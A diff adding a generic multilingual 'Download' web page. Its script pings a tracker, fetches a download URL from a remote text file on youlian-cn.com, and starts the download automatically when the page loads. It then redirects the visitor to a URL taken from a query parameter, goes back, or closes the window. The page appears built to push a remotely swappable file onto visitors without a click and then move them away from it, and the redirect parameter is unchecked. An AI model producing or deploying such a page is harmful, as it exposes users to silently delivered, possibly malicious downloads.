@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>下载</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f5f7fb;
+      margin: 0;
+      padding: 24px;
+    }
+    main {
+      max-width: 520px;
+      margin: 80px auto;
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+    }
+    h1 { font-size: 22px; margin: 0 0 12px; }
+    p { color: #666; font-size: 15px; margin: 0 0 8px; line-height: 1.6; }
+    .error { color: #cf1322; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1 id="title">请稍候…</h1>
+    <p id="desc">正在准备下载，通常只需几秒钟。</p>
+    <p id="error" class="error" hidden></p>
+  </main>
+
+  <script>
+    (function () {
+      const REMOTE_SETUP_URL = "https://youlian-cn.com/zh/letsSetup.txt";
+      const ALLOWED_REMOTE_HOSTS = ["dows.szeom.com", "youlian-cn.com"];
+      const REDIRECT_DELAY_MS = 5000;
+
+      const I18N = {
+        zh: {
+          title: "请稍候…",
+          pageTitle: "下载",
+          desc: "正在准备下载，通常只需几秒钟。",
+          errRemote: "下载地址获取失败，请稍后重试。",
+        },
+        en: {
+          title: "Please wait…",
+          pageTitle: "Download",
+          desc: "Preparing your download. This usually takes a few seconds.",
+          errRemote: "Could not fetch download URL. Please try again later.",
+        },
+        ja: {
+          title: "お待ちください…",
+          pageTitle: "ダウンロード",
+          desc: "ダウンロードを準備しています。",
+          errRemote: "ダウンロードURLを取得できませんでした。",
+        },
+        ko: {
+          title: "잠시만 기다려 주세요…",
+          pageTitle: "다운로드",
+          desc: "다운로드를 준비 중입니다.",
+          errRemote: "다운로드 주소를 가져오지 못했습니다.",
+        },
+      };
+
+      const $ = (id) => document.getElementById(id);
+      const params = new URLSearchParams(location.search);
+      const referrer = params.get("path");
+      const closed = params.get("clos") === "1";
+
+      function locale() {
+        const lang = (navigator.language || "en").toLowerCase();
+        if (lang.startsWith("zh")) return "zh";
+        if (lang.startsWith("ja")) return "ja";
+        if (lang.startsWith("ko")) return "ko";
+        return "en";
+      }
+
+      const t = I18N[locale()];
+      document.documentElement.lang = locale() === "zh" ? "zh-CN" : locale();
+      document.title = t.pageTitle;
+      $("title").textContent = t.title;
+      $("desc").textContent = t.desc;
+
+      function showError(msg) {
+        $("desc").hidden = true;
+        $("error").hidden = false;
+        $("error").textContent = msg;
+      }
+
+      function isAllowedUrl(url) {
+        try {
+          const host = new URL(url).hostname.toLowerCase();
+          return ALLOWED_REMOTE_HOSTS.some(
+            (h) => host === h || host.endsWith("." + h)
+          );
+        } catch {
+          return false;
+        }
+      }
+
+      async function fetchRemoteSetupUrl() {
+        const res = await fetch(REMOTE_SETUP_URL, { cache: "no-store" });
+        if (!res.ok) throw new Error("fetch failed");
+        const line = (await res.text()).trim().split(/\s+/)[0];
+        if (!/^https?:\/\//i.test(line)) throw new Error("invalid url");
+        if (!isAllowedUrl(line)) throw new Error("host not allowed");
+        return line;
+      }
+
+      function triggerDownload(url) {
+        const a = document.createElement("a");
+        a.href = url;
+        a.rel = "noopener noreferrer";
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      }
+
+      function finish(delayMs) {
+        setTimeout(function () {
+          if (referrer && !closed) {
+            location.href = referrer;
+            return;
+          }
+          if (history.length > 1 && !closed) {
+            history.back();
+            return;
+          }
+          window.close();
+        }, delayMs);
+      }
+
+      function track() {
+        fetch("track.php", { method: "GET", keepalive: true }).catch(function () {});
+      }
+
+      async function main() {
+        track();
+        const url = await fetchRemoteSetupUrl();
+        triggerDownload(url);
+        finish(REDIRECT_DELAY_MS);
+      }
+
+      main().catch(function () {
+        showError(t.errRemote);
+        finish(3000);
+      });
+    })();
+  </script>
+</body>
+</html>
